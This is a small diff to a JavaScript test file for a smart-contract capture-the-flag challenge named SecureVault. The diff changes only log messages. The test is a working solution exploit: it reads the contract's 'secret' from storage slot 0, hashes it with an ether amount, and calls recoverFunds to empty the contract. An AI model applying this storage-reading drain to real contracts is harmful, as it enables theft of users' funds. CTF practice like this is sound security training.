@@ -17,9 +17,9 @@ describe('CTF #1 SecureVault', function () {
 
   it('Should recover all funds', async function () {
     const secret = await ethers.provider.getStorageAt(challengeInstance.address, 0);
-    console.log(secret);
+    console.log('Secret value:', secret);
     const encodedAnswer = ethers.utils.solidityKeccak256(['uint256', 'uint256'], [secret, ethers.utils.parseEther('0.0002')]);
-    console.log(BigNumber.from(encodedAnswer).toString());
+    console.log('Msg.value and secret encoded together:', BigNumber.from(encodedAnswer).toString());
     const tx = await challengeInstance.recoverFunds(encodedAnswer, { value: ethers.utils.parseEther('0.0001') });
     await tx.wait();
     expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
